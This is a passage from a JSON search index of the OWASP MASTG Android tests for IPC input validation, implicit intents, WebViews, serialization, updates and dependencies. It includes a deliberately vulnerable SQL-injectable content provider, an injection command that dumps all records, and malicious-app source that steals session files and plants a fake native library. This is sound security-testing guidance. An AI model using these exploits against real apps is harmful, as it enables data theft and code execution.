for Sensitive Functionality Exposure Through IPC</li> <li> Testing for Overlay Attacks</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0025/#static-analysis","title":"Static Analysis","text":"<p>An example of a vulnerable IPC mechanism is shown below.</p> <p>You can use ContentProviders to access database information, and you can probe services to see if they return data. If data is not validated properly, the content provider may be prone to SQL injection while other apps are interacting with it. See the following vulnerable implementation of a ContentProvider.</p> <pre><code>&lt;provider\n    android:name=\".OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation\"\n    android:authorities=\"sg.vp.owasp_mobile.provider.College\"&gt;\n&lt;/provider&gt;\n</code></pre> <p>The <code>AndroidManifest.xml</code> above defines a content provider that's exported and therefore available to all other apps. The <code>query</code> function in the <code>OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.java</code> class should be inspected.</p> <pre><code>@Override\npublic Cursor query(Uri uri, String[] projection, String selection,String[] selectionArgs, String sortOrder) {\n    SQLiteQueryBuilder qb = new SQLiteQueryBuilder();\n    qb.setTables(STUDENTS_TABLE_NAME);\n\n    switch (uriMatcher.match(uri)) {\n        case STUDENTS:\n            qb.setProjectionMap(STUDENTS_PROJECTION_MAP);\n            break;\n\n        case STUDENT_ID:\n            // SQL Injection when providing an ID\n            qb.appendWhere( _ID + \"=\" + uri.getPathSegments().get(1));\n            Log.e(\"appendWhere\",uri.getPathSegments().get(1).toString());\n            break;\n\n        default:\n            throw new IllegalArgumentException(\"Unknown URI \" + uri);\n    }\n\n    if (sortOrder == null || sortOrder == \"\"){\n        /**\n         * By default sort on student names\n         */\n        sortOrder = NAME;\n    }\n    Cursor c = qb.query(db, projection, selection, selectionArgs,null, null, sortOrder);\n\n    /**\n     * register to watch a content URI for changes\n     */\n    c.setNotificationUri(getContext().getContentResolver(), uri);\n    return c;\n}\n</code></pre> <p>While the user is providing a STUDENT_ID at <code>content://sg.vp.owasp_mobile.provider.College/students</code>, the query statement is prone to SQL injection. Obviously prepared statements must be used to avoid SQL injection, but input validation should also be applied so that only input that the app is expecting is processed.</p> <p>All app functions that process data coming in through the UI should implement input validation:</p> <ul> <li>For user interface input, Android Saripaar v2 can be used.</li> <li>For input from IPC or URL schemes, a validation function should be created. For example, the following determines whether the string is alphanumeric:</li> </ul> <pre><code>public boolean isAlphaNumeric(String s){\n    String pattern= \"^[a-zA-Z0-9]*$\";\n    return s.matches(pattern);\n}\n</code></pre> <p>An alternative to validation functions is type conversion, with, for example, <code>Integer.parseInt</code> if only integers are expected. The OWASP Input Validation Cheat Sheet contains more information about this topic.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0025/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>The tester should manually test the input fields with strings like <code>OR 1=1--</code> if, for example, a local SQL injection vulnerability has been identified.</p> <p>On a rooted device, the command content can be used to query the data from a content provider. The following command queries the vulnerable function described above.</p> <pre><code># content query --uri content://sg.vp.owasp_mobile.provider.College/students\n</code></pre> <p>SQL injection can be exploited with the following command. Instead of getting the record for Bob only, the user can retrieve all data.</p> <pre><code># content query --uri content://sg.vp.owasp_mobile.provider.College/students --where \"name='Bob') OR 1=1--''\"\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/","title":"MASTG-TEST-0026: Testing Implicit Intents","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0026: Testing Implicit Intents (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/#overview","title":"Overview","text":"<p>When testing for implicit intents you need to check if they are vulnerable to injection attacks or potentially leaking sensitive data.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/#static-analysis","title":"Static Analysis","text":"<p>Inspect the Android Manifest and look for any <code>&lt;intent&gt;</code> signatures defined inside  blocks (which specify the set of other apps an app intends to interact with), check if it contains any system actions (e.g. <code>android.intent.action.GET_CONTENT</code>, <code>android.intent.action.PICK</code>, <code>android.media.action.IMAGE_CAPTURE</code>, etc.) and browse the source code for their occurrence. <p>For example, the following <code>Intent</code> doesn't specify any concrete component, meaning that it's an implicit intent. It sets the action <code>android.intent.action.GET_CONTENT</code> to ask the user for input data and then the app starts the intent by <code>startActivityForResult</code> and specifying an image chooser.</p> <pre><code>Intent intent = new Intent();\nintent.setAction(\"android.intent.action.GET_CONTENT\");\nstartActivityForResult(Intent.createChooser(intent, \"\"), REQUEST_IMAGE);\n</code></pre> <p>The app uses <code>startActivityForResult</code> instead of <code>startActivity</code>, indicating that it expects a result (in this case an image), so you should check how the return value of the intent is handled by looking for the <code>onActivityResult</code> callback. If the return value of the intent isn't properly validated, an attacker may be able to read arbitrary files or execute arbitrary code from the app's internal `/data/data/' storage. A full description of this type of attack can be found in the following blog post.","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/#case-1-arbitrary-file-read","title":"Case 1: Arbitrary File Read","text":"<p>In this example we're going to see how an attacker can read arbitrary files from within the app's internal storage <code>/data/data/&lt;appname&gt;</code> due to the improper validation of the return value of the intent.</p> <p>The <code>performAction</code> method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to <code>getFileItemFromUri</code>. This method copies the file to a temp folder, which is usual if this file is displayed internally. But if the app stores the URI provided file in an external temp directory e.g by calling <code>getExternalCacheDir</code> or <code>getExternalFilesDir</code> an attacker can read this file after setting the permission <code>android.permission.READ_EXTERNAL_STORAGE</code>.</p> <pre><code>private void performAction(Action action){\n  ...\n  Uri data = intent.getData();\n  if (!(data == null || (fileItemFromUri = getFileItemFromUri(data)) == null)) {\n      ...\n  }\n}\n\nprivate FileItem getFileItemFromUri(Context, context, Uri uri){\n  String fileName = UriExtensions.getFileName(uri, context);\n  File file = new File(getExternalCacheDir(), \"tmp\");\n  file.createNewFile();\n  copy(context.openInputStream(uri), new FileOutputStream(file));\n  ...\n}\n</code></pre> <p>The following is the source of a malicious app that exploits the above vulnerable code.</p> <p>AndroidManifest.xml</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n&lt;application&gt;\n  &lt;activity android:name=\".EvilContentActivity\"&gt;\n      &lt;intent-filter android:priority=\"999\"&gt;\n          &lt;action android:name=\"android.intent.action.GET_CONTENT\" /&gt;\n          &lt;data android:mimeType=\"*/*\" /&gt;\n      &lt;/intent-filter&gt;\n  &lt;/activity&gt;\n&lt;/application&gt;\n</code></pre> <p>EvilContentActivity.java</p> <pre><code>public class EvilContentActivity extends Activity{\n  @Override\n  protected void OnCreate(@Nullable Bundle savedInstanceState){\n    super.OnCreate(savedInstanceState);\n    setResult(-1, new Intent().setData(Uri.parse(\"file:///data/data/&lt;victim_app&gt;/shared_preferences/session.xml\")));\n    finish();\n  }\n}\n</code></pre> <p>If the user selects the malicious app to handle the intent, the attacker can now steal the <code>session.xml</code> file from the app's internal storage. In the previous example, the victim must explicitly select the attacker's malicious app in a dialog. However, developers may choose to suppress this dialog and automatically determine a recipient for the intent. This would allow the attack to occur without any additional user interaction.</p> <p>The following code sample implements this automatic selection of the recipient. By specifying a priority in the malicious app's intent filter, the attacker can influence the selection sequence.</p> <pre><code>Intent intent = new Intent(\"android.intent.action.GET_CONTENT\");\nfor(ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) {\n    intent.setClassName(info.activityInfo.packageName, info.activityInfo.name);\n    startActivityForResult(intent);\n    return;\n}\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/#case-2-arbitrary-code-execution","title":"Case 2: Arbitrary Code Execution","text":"<p>An improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows <code>content://</code> and <code>file://</code> URLs.</p> <p>An attacker can implement a <code>ContentProvider</code> that contains <code>public Cursor query(...)</code> to set an arbitrary file (in this case lib.so), and if the victim loads this file from the content provider by executing <code>copy</code> the attacker's <code>ParcelFileDescriptor openFile(...)</code> method will be executed and return a malicious fakelib.so.</p> <p>AndroidManifest.xml</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n&lt;application&gt;\n  &lt;activity android:name=\".EvilContentActivity\"&gt;\n      &lt;intent-filter android:priority=\"999\"&gt;\n          &lt;action android:name=\"android.intent.action.GET_CONTENT\" /&gt;\n          &lt;data android:mimeType=\"*/*\" /&gt;\n      &lt;/intent-filter&gt;\n  &lt;/activity&gt;\n  &lt;provider android:name=\".EvilContentProvider\" android:authorities=\"com.attacker.evil\" android:enabled=\"true\" android:exported=\"true\"&gt;&lt;/provider&gt;\n&lt;/application&gt;\n</code></pre> <p>EvilContentProvider.java</p> <pre><code>public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {\n    MatrixCursor matrixCursor = new MatrixCursor(new String[]{\"_display_name\"});\n    matrixCursor.addRow(new Object[]{\"../lib-main/lib.so\"});\n    return matrixCursor;\n}\npublic ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {\n    return ParcelFileDescriptor.open(new File(\"/data/data/com.attacker/fakelib.so\"), ParcelFileDescriptor.MODE_READ_ONLY);\n}\n</code></pre> <p>EvilContentActivity.java</p> <pre><code>public class EvilContentActivity extends Activity{\n  @Override\n  protected void OnCreate(@Nullable Bundle savedInstanceState){\n    super.OnCreate(savedInstanceState);\n    setResult(-1, new Intent().setData(Uri.parse(\"content:///data/data/com.attacker/fakelib.so\")));\n    finish();\n  }\n}\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0026/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>A convenient way to dynamically test for implicit intents, especially to identify potentially leaked sensitive data, is to use Frida or frida-trace and hook the <code>startActivityForResult</code> and <code>onActivityResult</code> methods and inspect the provided intents and the data they contain.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0027/","title":"MASTG-TEST-0027: Testing for URL Loading in WebViews","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0027: Testing for URL Loading in WebViews (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0027/#overview","title":"Overview","text":"<p>In order to test for URL loading in WebViews you need to carefully analyze handling page navigation, especially when users might be able to navigate away from a trusted environment. The default and safest behavior on Android is to let the default web browser open any link that the user might click inside the WebView. However, this default logic can be modified by configuring a <code>WebViewClient</code> which allows navigation requests to be handled by the app itself.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0027/#static-analysis","title":"Static Analysis","text":"","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0027/#check-for-page-navigation-handling-override","title":"Check for Page Navigation Handling Override","text":"<p>To test if the app is overriding the default page navigation logic by configuring a <code>WebViewClient</code> you should search for and inspect the following interception callback functions:</p> <ul> <li><code>shouldOverrideUrlLoading</code> allows your application to either abort loading WebViews with suspicious content by returning <code>true</code> or allow the WebView to load the URL by returning <code>false</code>. Considerations:<ul> <li>This method is not called for POST requests.</li> <li>This method is not called for XmlHttpRequests, iFrames, \"src\" attributes included in HTML or <code>&lt;script&gt;</code> tags. Instead, <code>shouldInterceptRequest</code> should take care of this.</li> </ul> </li> <li><code>shouldInterceptRequest</code> allows the application to return the data from resource requests. If the return value is null, the WebView will continue to load the resource as usual. Otherwise, the data returned by the <code>shouldInterceptRequest</code> method is used. Considerations:<ul> <li>This callback is invoked for a variety of URL schemes (e.g., <code>http(s):</code>, <code>data:</code>, <code>file:</code>, etc.), not only those schemes which send requests over the network.</li> <li>This is not called for <code>javascript:</code> or <code>blob:</code> URLs, or for assets accessed via <code>file:///android_asset/</code> or <code>file:///android_res/</code> URLs.   In the case of redirects, this is only called for the initial resource URL, not any subsequent redirect URLs.</li> <li>When Safe Browsing is enabled, these URLs still undergo Safe Browsing checks but the developer can allow the URL with <code>setSafeBrowsingWhitelist</code> or even ignore the warning via the <code>onSafeBrowsingHit</code> callback.</li> </ul> </li> </ul> <p>As you can see there are a lot of points to consider when testing the security of WebViews that have a WebViewClient configured, so be sure to carefully read and understand all of them by checking the <code>WebViewClient</code> Documentation.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0027/#check-for-enablesafebrowsing-disabled","title":"Check for EnableSafeBrowsing Disabled","text":"<p>While the default value of <code>EnableSafeBrowsing</code> is <code>true</code>, some applications might opt to disable it. To verify that SafeBrowsing is enabled, inspect the AndroidManifest.xml file and make sure that the configuration below is not present:</p> <pre><code>&lt;manifest&gt;\n    &lt;application&gt;\n        &lt;meta-data android:name=\"android.webkit.WebView.EnableSafeBrowsing\"\n                   android:value=\"false\" /&gt;\n        ...\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0027/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>A convenient way to dynamically test deep linking is to use Frida or frida-trace and hook the <code>shouldOverrideUrlLoading</code>, <code>shouldInterceptRequest</code> methods while using the app and clicking on links within the WebView. Be sure to also hook other related <code>Uri</code> methods such as <code>getHost</code>, <code>getScheme</code> or <code>getPath</code> which are typically used to inspect the requests and match known patterns or deny lists.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0034/","title":"MASTG-TEST-0034: Testing Object Persistence","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0034: Testing Object Persistence (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0034/#overview","title":"Overview","text":"<p>To test for object persistence being used for storing sensitive information on the device, first identify all instances of object serialization and check if they carry any sensitive data. If yes, check if it is properly protected against eavesdropping or unauthorized modification.</p> <p>There are a few generic remediation steps that you can always take:</p> <ol> <li>Make sure that sensitive data has been encrypted and HMACed/signed after serialization/persistence. Evaluate the signature or HMAC before you use the data. See the chapter \"Android Cryptographic APIs\" for more details.</li> <li>Make sure that the keys used in step 1 can't be extracted easily. The user and/or application instance should be properly authenticated/authorized to obtain the keys. See the chapter \"Data Storage on Android\" for more details.</li> <li>Make sure that the data within the de-serialized object is carefully validated before it is actively used (e.g., no exploit of business/application logic).</li> </ol> <p>For high-risk applications that focus on availability, we recommend that you use <code>Serializable</code> only when the serialized classes are stable. Second, we recommend not using reflection-based persistence because</p> <ul> <li>the attacker could find the method's signature via the String-based argument</li> <li>the attacker might be able to manipulate the reflection-based steps to execute business logic.</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0034/#static-analysis","title":"Static Analysis","text":"","tags":["android","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0034/#object-serialization","title":"Object Serialization","text":"<p>Search the source code for the following keywords:</p> <ul> <li><code>import java.io.Serializable</code></li> <li><code>implements Serializable</code></li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0034/#json","title":"JSON","text":"<p>If you need to counter memory-dumping, make sure that very sensitive information is not stored in the JSON format because you can't guarantee prevention of anti-memory dumping techniques with the standard libraries. You can check for the following keywords in the corresponding libraries:</p> <p><code>JSONObject</code> Search the source code for the following keywords:</p> <ul> <li><code>import org.json.JSONObject;</code></li> <li><code>import org.json.JSONArray;</code></li> </ul> <p><code>GSON</code> Search the source code for the following keywords:</p> <ul> <li><code>import com.google.gson</code></li> <li><code>import com.google.gson.annotations</code></li> <li><code>import com.google.gson.reflect</code></li> <li><code>import com.google.gson.stream</code></li> <li><code>new Gson();</code></li> <li>Annotations such as <code>@Expose</code>, <code>@JsonAdapter</code>, <code>@SerializedName</code>,<code>@Since</code>, and <code>@Until</code></li> </ul> <p><code>Jackson</code> Search the source code for the following keywords:</p> <ul> <li><code>import com.fasterxml.jackson.core</code></li> <li><code>import org.codehaus.jackson</code> for the older version.</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0034/#orm","title":"ORM","text":"<p>When you use an ORM library, make sure that the data is stored in an encrypted database and the class representations are individually encrypted before storing it. See the chapters \"Data Storage on Android\" and \"Android Cryptographic APIs\" for more details. You can check for the following keywords in the corresponding libraries:</p> <p><code>OrmLite</code> Search the source code for the following keywords:</p> <ul> <li><code>import com.j256.*</code></li> <li><code>import com.j256.dao</code></li> <li><code>import com.j256.db</code></li> <li><code>import com.j256.stmt</code></li> <li><code>import com.j256.table\\</code></li> </ul> <p>Please make sure that logging is disabled.</p> <p><code>SugarORM</code> Search the source code for the following keywords:</p> <ul> <li><code>import com.github.satyan</code></li> <li><code>extends SugarRecord&lt;Type&gt;</code></li> <li>In the AndroidManifest, there will be <code>meta-data</code> entries with values such as <code>DATABASE</code>, <code>VERSION</code>, <code>QUERY_LOG</code> and <code>DOMAIN_PACKAGE_NAME</code>.</li> </ul> <p>Make sure that <code>QUERY_LOG</code> is set to false.</p> <p><code>GreenDAO</code> Search the source code for the following keywords:</p> <ul> <li><code>import org.greenrobot.greendao.annotation.Convert</code></li> <li><code>import org.greenrobot.greendao.annotation.Entity</code></li> <li><code>import org.greenrobot.greendao.annotation.Generated</code></li> <li><code>import org.greenrobot.greendao.annotation.Id</code></li> <li><code>import org.greenrobot.greendao.annotation.Index</code></li> <li><code>import org.greenrobot.greendao.annotation.NotNull</code></li> <li><code>import org.greenrobot.greendao.annotation.*</code></li> <li><code>import org.greenrobot.greendao.database.Database</code></li> <li><code>import org.greenrobot.greendao.query.Query</code></li> </ul> <p><code>ActiveAndroid</code> Search the source code for the following keywords:</p> <ul> <li><code>ActiveAndroid.initialize(&lt;contextReference&gt;);</code></li> <li><code>import com.activeandroid.Configuration</code></li> <li><code>import com.activeandroid.query.*</code></li> </ul> <p><code>Realm</code> Search the source code for the following keywords:</p> <ul> <li><code>import io.realm.RealmObject;</code></li> <li><code>import io.realm.annotations.PrimaryKey;</code></li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0034/#parcelable","title":"Parcelable","text":"<p>Make sure that appropriate security measures are taken when sensitive information is stored in an Intent via a Bundle that contains a Parcelable. Use explicit Intents and verify proper additional security controls when using application-level IPC (e.g., signature verification, intent-permissions, crypto).</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0034/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>There are several ways to perform dynamic analysis:</p> <ol> <li>For the actual persistence: Use the techniques described in the data storage chapter.</li> <li>For reflection-based approaches: Use  Frida for Android to hook into the deserialization methods or add unprocessable information to the serialized objects to see how they are handled (e.g., whether the application crashes or extra information can be extracted by enriching the objects).</li> </ol>","tags":["android","L1","L2","test","MSTG-PLATFORM-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0036/","title":"MASTG-TEST-0036: Testing Enforced Updating","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0036: Testing Enforced Updating (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-ARCH-9","masvs-code-2"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0036/#overview","title":"Overview","text":"<p>To test for enforced updating you need to check if the app has support for in-app updates and validate if it's properly enforced so that the user is not able to continue using the app without updating it first.</p>","tags":["android","L2","test","MSTG-ARCH-9","masvs-code-2"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0036/#static-analysis","title":"Static analysis","text":"<p>The code sample below shows the example of an app-update:</p> <pre><code>//Part 1: check for update\n// Creates instance of the manager.\nAppUpdateManager appUpdateManager = AppUpdateManagerFactory.create(context);\n\n// Returns an intent object that you use to check for an update.\nTask&lt;AppUpdateInfo&gt; appUpdateInfo = appUpdateManager.getAppUpdateInfo();\n\n// Checks that the platform will allow the specified type of update.\nif (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE\n      // For a flexible update, use AppUpdateType.FLEXIBLE\n      &amp;&amp; appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)) {\n\n\n\n                  //...Part 2: request update\n                  appUpdateManager.startUpdateFlowForResult(\n                     // Pass the intent that is returned by 'getAppUpdateInfo()'.\n                     appUpdateInfo,\n                     // Or 'AppUpdateType.FLEXIBLE' for flexible updates.\n                     AppUpdateType.IMMEDIATE,\n                     // The current activity making the update request.\n                     this,\n                     // Include a request code to later monitor this update request.\n                     MY_REQUEST_CODE);\n\n\n\n                     //...Part 3: check if update completed successfully\n @Override\n public void onActivityResult(int requestCode, int resultCode, Intent data) {\n   if (myRequestCode == MY_REQUEST_CODE) {\n     if (resultCode != RESULT_OK) {\n       log(\"Update flow failed! Result code: \" + resultCode);\n       // If the update is cancelled or fails,\n       // you can request to start the update again in case of forced updates\n     }\n   }\n }\n\n //..Part 4:\n // Checks that the update is not stalled during 'onResume()'.\n// However, you should execute this check at all entry points into the app.\n@Override\nprotected void onResume() {\n  super.onResume();\n\n  appUpdateManager\n      .getAppUpdateInfo()\n      .addOnSuccessListener(\n          appUpdateInfo -&gt; {\n            ...\n            if (appUpdateInfo.updateAvailability()\n                == UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS) {\n                // If an in-app update is already running, resume the update.\n                manager.startUpdateFlowForResult(\n                    appUpdateInfo,\n                    IMMEDIATE,\n                    this,\n                    MY_REQUEST_CODE);\n            }\n          });\n}\n}\n</code></pre> <p>Source: https://developer.android.com/guide/app-bundle/in-app-updates</p>","tags":["android","L2","test","MSTG-ARCH-9","masvs-code-2"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0036/#dynamic-analysis","title":"Dynamic analysis","text":"<p>In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store. Next, verify whether or not you can continue to use the application without updating it. If an update prompt is given, verify if you can still use the application by canceling the prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend will stop calls to vulnerable backends and/or whether the vulnerable app-version itself is blocked by the backend. Lastly, try modifying the version number of an app while intercepting its traffic using a MIMT proxy, and observe how the backend responds (including whether the change is recorded, for example).</p>","tags":["android","L2","test","MSTG-ARCH-9","masvs-code-2"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0042/","title":"MASTG-TEST-0042: Checking for Weaknesses in Third Party Libraries","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Identify Dependencies with Known Vulnerabilities in the Android Project</li> <li> Dependencies with Known Vulnerabilities in the App's SBOM</li> </ul>","tags":["android","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0042/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0042/#static-analysis","title":"Static Analysis","text":"<p>Detecting vulnerabilities in third party dependencies can be done by means of the OWASP Dependency checker. This is best done by using a gradle plugin, such as <code>dependency-check-gradle</code>. In order to use the plugin, the following steps need to be applied: Install the plugin from the Maven central repository by adding the following script to your build.gradle:</p> <pre><code>buildscript {\n    repositories {\n        mavenCentral()\n    }\n    dependencies {\n        classpath 'org.owasp:dependency-check-gradle:3.2.0'\n    }\n}\n\napply plugin: 'org.owasp.dependencycheck'\n</code></pre> <p>Once gradle has invoked the plugin, you can create a report by running:</p> <pre><code>gradle assemble\ngradle dependencyCheckAnalyze --info\n</code></pre> <p>The report will be in <code>build/reports</code> unless otherwise configured. Use the report in order to analyze the vulnerabilities found. See remediation on what to do given the vulnerabilities found with the libraries.</p> <p>Please be advised that the plugin requires to download a vulnerability feed. Consult the documentation in case issues arise with the plugin.</p> <p>Lastly, please note that for hybrid applications, one will have to check the JavaScript dependencies with RetireJS. Similarly for Xamarin, one will have to check the C# dependencies.</p> <p>When a library is found to contain vulnerabilities, then the following reasoning applies:</p> <ul> <li>Is the library packaged with the application? Then check whether the library has a version in which the vulnerability is patched. If not, check whether the vulnerability actually affects the application. If that is the case or might be the case in the future, then look for an alternative which provides similar functionality, but without the vulnerabilities.</li> <li>Is the library not packaged with the application? See if there is a patched version in which the vulnerability is fixed. If this is not the case, check if the implications of the vulnerability for the build-process. Could the vulnerability impede a build or weaken the security of the build-pipeline? Then try looking for an alternative in which the vulnerability is fixed.</li> </ul> <p>When the sources are not available, one can decompile the app and check the JAR files. When Dexguard or  Proguard are applied properly, then version information about the library is often obfuscated and therefore gone. Otherwise you can still find the information very often in the comments of the Java files of given libraries. Tools such as MobSF can help in analyzing the possible libraries packed with the application. If you can retrieve the version of the library, either via comments, or via specific methods used in certain versions, you can look them up for CVEs by hand.</p> <p>If the application is a high-risk application, you will end up vetting the library manually. In that case, there are specific requirements for native code, which you can find in the chapter \"Testing Code Quality\". Next to that, it is good to vet whether all best practices for software engineering are applied.</p>","tags":["android","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0042/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>The dynamic analysis of this section comprises validating whether the copyrights of the licenses have been adhered to. This often means that the application should have an <code>about</code> or <code>EULA</code> section in which the copyright statements are noted as required by the license of the third party library.</p>","tags":["android","L1","L2","test","MSTG-CODE-5","masvs-code-3","deprecated"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0043/","title":"MASTG-TEST-0043: Memory Corruption Bugs","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0043: Memory Corruption Bugs (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-CODE-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0043/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-CODE-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0043/#static-analysis","title":"Static Analysis","text":"<p>There are various items to look for:</p> <ul> <li>Are there native code parts? If so: check for the given issues in the general memory corruption section. Native code can easily be spotted given JNI-wrappers, .CPP/.H/.C files, NDK or other native frameworks.</li> <li>Is there Java code or Kotlin code? Look for Serialization/deserialization issues, such as described in A brief history of Android deserialization vulnerabilities.</li> </ul> <p>Note that there can be Memory leaks in Java/Kotlin code as well. Look for various items, such as: BroadcastReceivers which are not unregistered, static references to <code>Activity</code> or <code>View</code> classes, Singleton classes that have references to <code>Context</code>, Inner Class references, Anonymous Class references, AsyncTask references, Handler references, Threading done wrong, TimerTask references. For more details, please check:</p> <ul> <li>9 ways to avoid memory leaks in Android</li> <li>Memory Leak Patterns in Android.</li> </ul>","tags":["android","L1","L2","test","MSTG-CODE-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0043/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>There are various steps to take:</p> <ul> <li>In case of native code: use Valgrind or Mempatrol to analyze the memory usage and memory calls made by the code.</li> <li>In case of Java/Kotlin code, try to recompile the app and use it with Squares leak canary.</li> <li>Check with the Memory Profiler from Android Studio for leakage.</li> <li>Check with the Android Java Deserialization Vulnerability Tester, for serialization vulnerabilities.</li> </ul>","tags":["android","L1","L2","test","MSTG-CODE-8","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0044/","title":"MASTG-TEST-0044: Make Sure That Free Security Features Are Activated","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be 